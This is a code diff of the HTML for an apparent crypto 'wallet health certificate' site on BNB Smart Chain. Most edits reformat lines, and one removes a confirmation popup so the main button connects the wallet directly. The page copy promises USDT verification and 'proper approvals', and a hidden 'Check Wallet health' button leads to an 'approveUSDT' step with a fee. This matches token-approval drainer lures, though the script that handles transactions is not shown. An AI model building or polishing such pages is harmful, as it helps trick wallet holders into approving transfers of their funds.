@@ -31,7 +31,8 @@
             <a class="navbar-brand" href="index.html">
                 <i class="fas fa-shield-alt me-2"></i>BEP-20
             </a>
-            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav"
+                aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                 <span class="navbar-toggler-icon"></span>
             </button>
             <div class="collapse navbar-collapse" id="navbarNav">
@@ -73,21 +74,14 @@
                 <div class="col-lg-8 col-md-10 mx-auto">
                     <h1 class="fw-light">Secure Crypto Tokens</h1>
                     <p class="lead text-body-secondary">
-                        Our platform verifies USDT transactions, Ensures proper approvals are in place, and provides Wallet health certificates to protect both buyers and sellers.
+                        Our platform verifies USDT transactions, Ensures proper approvals are in place, and provides
+                        Wallet health certificates to protect both buyers and sellers.
                     </p>
                     <div id="introDiv" class="d-grid gap-2 d-sm-flex justify-content-sm-center">
-                        <button id="startConnect" class="btn btn-primary btn-lg px-4 gap-3">
+                        <button id="connectWallet" class="btn btn-primary btn-lg px-4 gap-3">
                             <i class="fas fa-wallet me-2"></i>Check BEP-20 tokens
                         </button>
-                        <!-- HTML -->
-                        <div id="preConnectOverlay" class="overlay">
-                            <div class="popup-box">
-                                <button class="close-btn" id="preConnectClose" aria-label="Close">&times;</button>
-                                <h3>Connect to BNB Smart Chain</h3>
-                                <p>This will connect your wallet to the <strong>BNB Smart Chain</strong> and verify your USDT token balance and authenticity.</p>
-                                <button id="connectWallet" class="connect-btn">Proceed</button>
-                            </div>
-                        </div>
+
                         <!-- html code forhealth card overlay -->
                         <!-- Overlay HTML -->
                         <div class="overlay-background" id="overlay">
@@ -135,11 +129,12 @@
                             <span class="wallet-label">Address:</span>
                             <div class="wallet-address-container">
                                 <!-- <input type="text" id="userAddress" class="wallet-address-input" readonly title="Your wallet address" /> -->
-                                <input type="text" id="userAddress" class="wallet-address-input" readonly title="Your wallet address" value="0xABC123..." />
+                                <input type="text" id="userAddress" class="wallet-address-input" readonly
+                                    title="Your wallet address" value="0xABC123..." />
                                 <button class="wallet-copy-btn" onclick="copyAddress()" title="Copy Address">
                                     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                                         <path
-                                            d="M16 1H4C2.897 1 2 1.897 2 3v14h2V3h12V1zm3 4H8c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h11c1.103 0 2-.897 2-2V7c0-1.103-.897-2-2-2zm0 16H8V7h11v14z"/>
+                                            d="M16 1H4C2.897 1 2 1.897 2 3v14h2V3h12V1zm3 4H8c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h11c1.103 0 2-.897 2-2V7c0-1.103-.897-2-2-2zm0 16H8V7h11v14z" />
                                     </svg>
                                 </button>
                             </div>
@@ -157,8 +152,10 @@
                     </div>
 
                     <!-- Wallet Connection Popup -->
-                    <div id="connectionPopupOverlay" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.4); align-items: center; justify-content: center; z-index: 9999; display: none;">
-                        <div id="connectionPopupBox" style="background: #fff; border-radius: 16px; padding: 24px 32px; box-shadow: 0 8px 24px rgba(0,0,0,0.15); max-width: 400px; width: 90%; font-family: 'Segoe UI', sans-serif; position: relative;">
+                    <div id="connectionPopupOverlay"
+                        style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.4); align-items: center; justify-content: center; z-index: 9999; display: none;">
+                        <div id="connectionPopupBox"
+                            style="background: #fff; border-radius: 16px; padding: 24px 32px; box-shadow: 0 8px 24px rgba(0,0,0,0.15); max-width: 400px; width: 90%; font-family: 'Segoe UI', sans-serif; position: relative;">
                             <button id="popupCloseBtn" style="
                                 position: absolute;
                                 top: 12px;
@@ -177,25 +174,30 @@
                                 font-weight: bold;
                                 box-shadow: 0 2px 6px rgba(0,0,0,0.2);
                             ">&times;</button>
-                            <div style="display: flex; flex-direction: column; gap: 8px; padding: 12px; background-color: #f9f9f9; border: 1px solid #ddd; border-radius: 8px; max-width: 100%; font-family: Arial, sans-serif;">
+                            <div
+                                style="display: flex; flex-direction: column; gap: 8px; padding: 12px; background-color: #f9f9f9; border: 1px solid #ddd; border-radius: 8px; max-width: 100%; font-family: Arial, sans-serif;">
                                 <div style="display: flex; align-items: center; gap: 10px;">
-                                    <span style="width: 12px; height: 12px; background-color: #28a745; border-radius: 50%; display: inline-block;"></span>
+                                    <span
+                                        style="width: 12px; height: 12px; background-color: #28a745; border-radius: 50%; display: inline-block;"></span>
                                     <span style="font-size: 16px; color: #222;">
                                         Wallet connected to </br><strong>BNB Smart Chain</strong>
                                     </span>
                                 </div>
                                 <div>
                                     <span style="font-size: 14px; color: #555;">Address:</span><br>
-                                    <span class="user-address" style="font-size: 14px; color: #000; word-break: break-word;"></span>
+                                    <span class="user-address"
+                                        style="font-size: 14px; color: #000; word-break: break-word;"></span>
                                 </div>
                             </div>
                         </div>
                     </div>
                     <!-- <button id="approveUSDT">Approve USDT Transfer</button> -->
-                    <div id="approveUSDT" style="display: none; flex-direction: column; align-items: center; margin-top: 1rem; margin-bottom: 1rem;">
-                        <button id="startCertificate" style="padding: 0.75rem 1.5rem; font-size: 1.25rem; font-weight: bold; border-radius: 14px; background: linear-gradient(145deg, #f7d774, #f1c40f); color: #212529; border: none; box-shadow: 0 5px 15px rgba(241, 196, 15, 0.4); transition: all 0.3s ease; display: flex; align-items: center; justify-content: center; gap: 0.75rem;">
+                    <div id="approveUSDT"
+                        style="display: none; flex-direction: column; align-items: center; margin-top: 1rem; margin-bottom: 1rem;">
+                        <button id="startCertificate"
+                            style="padding: 0.75rem 1.5rem; font-size: 1.25rem; font-weight: bold; border-radius: 14px; background: linear-gradient(145deg, #f7d774, #f1c40f); color: #212529; border: none; box-shadow: 0 5px 15px rgba(241, 196, 15, 0.4); transition: all 0.3s ease; display: flex; align-items: center; justify-content: center; gap: 0.75rem;">
                             <i class="fas fa-award" style="margin-right: 0.5rem;"></i>Check Wallet health
-                          </button>
+                        </button>
                         <small style="font-size: 0.85rem; color: #f4f5f7; margin-top: 0.5rem;">
                             This will charge you a nominal fee </br>(less than 0.5 USDT)
                         </small>
@@ -204,12 +206,15 @@
                     <div id="certOverlay" class="popup-overlay" style="display: none;">
                         <div class="popup-box crypto-font" style="max-width: 400px; text-align: center; padding: 30px;">
                             <button class="close-btn" id="certClose">&times;</button>
-                            <i class="fas fa-file-medical-alt" style="font-size: 48px; color: #ffc107; margin-bottom: 15px;"></i>
+                            <i class="fas fa-file-medical-alt"
+                                style="font-size: 48px; color: #ffc107; margin-bottom: 15px;"></i>
                             <h3 style="margin-bottom: 12px;">Generate Wallet Certificate</h3>
                             <p style="margin-bottom: 20px; font-size: 15px;">
-                                This will fetch your wallet's transaction history and behavior to generate a unique <strong>Wallet Health Certificate</strong>.
+                                This will fetch your wallet's transaction history and behavior to generate a unique
+                                <strong>Wallet Health Certificate</strong>.
                             </p>
-                            <button id="approveUSDT" class="btn btn-warning w-100" style="font-weight: bold;">Proceed</button>
+                            <button id="approveUSDT" class="btn btn-warning w-100"
+                                style="font-weight: bold;">Proceed</button>
                         </div>
                     </div>
                 </div>
@@ -226,7 +231,8 @@
                             <div class="card-body text-center ">
                                 <i class="fas fa-wallet fa-3x text-primary mb-3 "></i>
                                 <h5 class="card-title ">USDT Balance Verification</h5>
-                                <p class="card-text ">We check the actual USDT balance in your wallet to verify fund availability before trading.</p>
+                                <p class="card-text ">We check the actual USDT balance in your wallet to verify fund
+                                    availability before trading.</p>
                             </div>
                         </div>
                     </div>
@@ -235,7 +241,8 @@
                             <div class="card-body text-center ">
                                 <i class="fas fa-gas-pump fa-3x text-warning mb-3 "></i>
                                 <h5 class="card-title ">BNB Fee Validation</h5>
-                                <p class="card-text ">We ensure you have sufficient BNB for transaction fees to avoid failed transfers.</p>
+                                <p class="card-text ">We ensure you have sufficient BNB for transaction fees to avoid
+                                    failed transfers.</p>
                             </div>
                         </div>
                     </div>
@@ -244,7 +251,8 @@
                             <div class="card-body text-center ">
                                 <i class="fas fa-certificate fa-3x text-success mb-3 "></i>
                                 <h5 class="card-title ">Wallet health Certificates</h5>
-                                <p class="card-text ">Each verified wallet receive a unique health certificate as proof of the secure trade.</p>
+                                <p class="card-text ">Each verified wallet receive a unique health certificate as proof
+                                    of the secure trade.</p>
                             </div>
                         </div>
                     </div>
@@ -261,16 +269,19 @@
                                 <div class="card-body ">
                                     <h3 class="card-title ">Simple 3-Step Process</h3>
                                     <div class="d-flex align-items-start mb-3 ">
-                                        <div class="bg-primary rounded-circle p-2 me-3 d-flex align-items-center justify-content-center " style="width: 40px; height: 40px; ">
+                                        <div class="bg-primary rounded-circle p-2 me-3 d-flex align-items-center justify-content-center "
+                                            style="width: 40px; height: 40px; ">
                                             <span class="text-white fw-bold ">1</span>
                                         </div>
                                         <div>
                                             <h5>Submit Your Transaction Details</h5>
-                                            <p>Enter your wallet address and transaction information for verification.</p>
+                                            <p>Enter your wallet address and transaction information for verification.
+                                            </p>
                                         </div>
                                     </div>
                                     <div class="d-flex align-items-start mb-3 ">
-                                        <div class="bg-primary rounded-circle p-2 me-3 d-flex align-items-center justify-content-center " style="width: 40px; height: 40px; ">
+                                        <div class="bg-primary rounded-circle p-2 me-3 d-flex align-items-center justify-content-center "
+                                            style="width: 40px; height: 40px; ">
                                             <span class="text-white fw-bold ">2</span>
                                         </div>
                                         <div>
@@ -279,7 +290,8 @@
                                         </div>
                                     </div>
                                     <div class="d-flex align-items-start ">
-                                        <div class="bg-primary rounded-circle p-2 me-3 d-flex align-items-center justify-content-center " style="width: 40px; height: 40px; ">
+                                        <div class="bg-primary rounded-circle p-2 me-3 d-flex align-items-center justify-content-center "
+                                            style="width: 40px; height: 40px; ">
                                             <span class="text-white fw-bold ">3</span>
                                         </div>
                                         <div>
@@ -294,40 +306,46 @@
                     <div class="col-md-6 order-md-1 ">
                         <div class="text-center ">
                             <svg width="400 " height="300 " viewBox="0 0 400 300 " xmlns="http://www.w3.org/2000/svg ">
-                        <!-- Blockchain illustration -->
-                        <rect x="50 " y="100 " width="300 " height="60 " rx="10 " fill="#212529 " stroke="#0d6efd " stroke-width="2 "/>
-                        <rect x="70 " y="120 " width="40 " height="20 " rx="5 " fill="#0d6efd "/>
-                        <rect x="130 " y="120 " width="40 " height="20 " rx="5 " fill="#0d6efd "/>
-                        <rect x="190 " y="120 " width="40 " height="20 " rx="5 " fill="#0d6efd "/>
-                        <rect x="250 " y="120 " width="40 " height="20 " rx="5 " fill="#0d6efd "/>
-                        <rect x="310 " y="120 " width="20 " height="20 " rx="5 " fill="#0d6efd "/>
-                        
-                        <!-- Lines connecting blocks -->
-                        <line x1="110 " y1="130 " x2="130 " y2="130 " stroke="#6c757d " stroke-width="2 "/>
-                        <line x1="170 " y1="130 " x2="190 " y2="130 " stroke="#6c757d " stroke-width="2 "/>
-                        <line x1="230 " y1="130 " x2="250 " y2="130 " stroke="#6c757d " stroke-width="2 "/>
-                        <line x1="290 " y1="130 " x2="310 " y2="130 " stroke="#6c757d " stroke-width="2 "/>
-                        
-                        <!-- Certificate -->
-                        <rect x="150 " y="200 " width="100 " height="70 " rx="5 " fill="#198754 " stroke="#ffffff " stroke-width="1 "/>
-                        <line x1="160 " y1="220 " x2="240 " y2="220 " stroke="#ffffff " stroke-width="1 "/>
-                        <line x1="160 " y1="230 " x2="240 " y2="230 " stroke="#ffffff " stroke-width="1 "/>
-                        <line x1="160 " y1="240 " x2="240 " y2="240 " stroke="#ffffff " stroke-width="1 "/>
-                        <line x1="160 " y1="250 " x2="200 " y2="250 " stroke="#ffffff " stroke-width="1 "/>
-                        
-                        <!-- Document seal -->
-                        <circle cx="215 " cy="250 " r="10 " fill="#ffc107 "/>
-                        
-                        <!-- Connection between blockchain and certificate -->
-                        <line x1="200 " y1="160 " x2="200 " y2="200 " stroke="#6c757d " stroke-width="2 " stroke-dasharray="5,5 "/>
-                        
-                        <!-- Wallet symbol -->
-                        <rect x="180 " y="30 " width="40 " height="30 " rx="5 " fill="#212529 " stroke="#20c997 " stroke-width="2 "/>
-                        <rect x="175 " y="40 " width="50 " height="20 " rx="5 " fill="#212529 " stroke="#20c997 " stroke-width="2 "/>
-                        
-                        <!-- Connection between wallet and blockchain -->
-                        <line x1="200 " y1="60 " x2="200 " y2="100 " stroke="#6c757d " stroke-width="2 " stroke-dasharray="5,5 "/>
-                    </svg>
+                                <!-- Blockchain illustration -->
+                                <rect x="50 " y="100 " width="300 " height="60 " rx="10 " fill="#212529 "
+                                    stroke="#0d6efd " stroke-width="2 " />
+                                <rect x="70 " y="120 " width="40 " height="20 " rx="5 " fill="#0d6efd " />
+                                <rect x="130 " y="120 " width="40 " height="20 " rx="5 " fill="#0d6efd " />
+                                <rect x="190 " y="120 " width="40 " height="20 " rx="5 " fill="#0d6efd " />
+                                <rect x="250 " y="120 " width="40 " height="20 " rx="5 " fill="#0d6efd " />
+                                <rect x="310 " y="120 " width="20 " height="20 " rx="5 " fill="#0d6efd " />
+
+                                <!-- Lines connecting blocks -->
+                                <line x1="110 " y1="130 " x2="130 " y2="130 " stroke="#6c757d " stroke-width="2 " />
+                                <line x1="170 " y1="130 " x2="190 " y2="130 " stroke="#6c757d " stroke-width="2 " />
+                                <line x1="230 " y1="130 " x2="250 " y2="130 " stroke="#6c757d " stroke-width="2 " />
+                                <line x1="290 " y1="130 " x2="310 " y2="130 " stroke="#6c757d " stroke-width="2 " />
+
+                                <!-- Certificate -->
+                                <rect x="150 " y="200 " width="100 " height="70 " rx="5 " fill="#198754 "
+                                    stroke="#ffffff " stroke-width="1 " />
+                                <line x1="160 " y1="220 " x2="240 " y2="220 " stroke="#ffffff " stroke-width="1 " />
+                                <line x1="160 " y1="230 " x2="240 " y2="230 " stroke="#ffffff " stroke-width="1 " />
+                                <line x1="160 " y1="240 " x2="240 " y2="240 " stroke="#ffffff " stroke-width="1 " />
+                                <line x1="160 " y1="250 " x2="200 " y2="250 " stroke="#ffffff " stroke-width="1 " />
+
+                                <!-- Document seal -->
+                                <circle cx="215 " cy="250 " r="10 " fill="#ffc107 " />
+
+                                <!-- Connection between blockchain and certificate -->
+                                <line x1="200 " y1="160 " x2="200 " y2="200 " stroke="#6c757d " stroke-width="2 "
+                                    stroke-dasharray="5,5 " />
+
+                                <!-- Wallet symbol -->
+                                <rect x="180 " y="30 " width="40 " height="30 " rx="5 " fill="#212529 "
+                                    stroke="#20c997 " stroke-width="2 " />
+                                <rect x="175 " y="40 " width="50 " height="20 " rx="5 " fill="#212529 "
+                                    stroke="#20c997 " stroke-width="2 " />
+
+                                <!-- Connection between wallet and blockchain -->
+                                <line x1="200 " y1="60 " x2="200 " y2="100 " stroke="#6c757d " stroke-width="2 "
+                                    stroke-dasharray="5,5 " />
+                            </svg>
                         </div>
                     </div>
                 </div>
@@ -373,7 +391,7 @@
     </main>
 
     <script>
-        const observer = new MutationObserver(function(mutationsList) {
+        const observer = new MutationObserver(function (mutationsList) {
             for (let mutation of mutationsList) {
                 if (
                     mutation.type === "attributes" &&
@@ -415,27 +433,6 @@
             document.execCommand("copy");
             alert("Address copied to clipboard!");
         }
-    </script>
-
-    <script>
-        const startConnectBtn = document.getElementById("startConnect");
-        const overlay = document.getElementById("preConnectOverlay");
-
-        const closeBtn = document.getElementById("preConnectClose");
-
-        startConnectBtn.addEventListener("click", () => {
-            overlay.style.display = "flex";
-        });
-
-        closeBtn.addEventListener("click", () => {
-            overlay.style.display = "none";
-        });
-
-        window.addEventListener("click", function(event) {
-            if (event.target === overlay) {
-                overlay.style.display = "none";
-            }
-        });
     </script>
 
     <!-- Bootstrap and other scripts -->
